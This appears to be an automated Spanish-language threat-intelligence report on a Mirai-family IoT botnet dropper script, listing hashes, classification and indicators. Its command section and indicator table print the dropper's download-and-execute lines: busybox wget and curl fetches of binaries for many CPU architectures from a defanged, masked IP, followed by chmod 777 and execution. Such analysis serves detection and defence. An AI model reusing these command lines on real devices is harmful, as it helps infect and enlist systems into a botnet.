# 🧬 Payload Analysis

`8851c1d65335047650154091e1bddd2197b77ac588a1a398825142fc77d3031f`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 24 comandos observados o extraídos. Se identificaron 38 indicadores técnicos. **Perfil técnico:** `Linux embebido / IoT` (probable). La presencia de BusyBox, junto con la evidencia de familia Mirai, es consistente con malware orientado a sistemas embebidos e IoT. **Ficha malware:** [malware-like/oraculo/botnet/8851c1d65335047650154091e1bddd2197b77ac588a1a398825142fc77d3031f.md](../../../../../malware-like/oraculo/botnet/8851c1d65335047650154091e1bddd2197b77ac588a1a398825142fc77d3031f.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:34:34.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8851c1d65335047650154091e1bddd2197b77ac588a1a398825142fc77d3031f`
- **MD5:** `965710e88b5486f98f695f6de128ade7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.24 |
| Strings | 44 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; .
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5;
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6;
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7;
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k;
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips;
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl;
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; .
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; .
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; .
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; .
busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRi
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaR
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaR
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaR
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaR
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaR
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaR
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRi
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRi
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRi
curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRi
curl hxxp://31.77.227.XXX/z0l
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; | strings |
| url | hxxp://31.77.227.XXX/z0l | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; | strings |
| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; | strings |
| ip | 31.77.227.XXX | static_analysis |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; . | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; . | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; . | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; . | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; . | strings |
| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86 | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRi | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaR | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaR | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaR | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaR | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaR | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaR | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRi | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRi | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRi | strings |
| command | curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRi | strings |
| command | curl hxxp://31.77.227.XXX/z0l | strings |
| hash | 8851c1d65335047650154091e1bddd2197b77ac588a1a398825142fc77d3031f | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
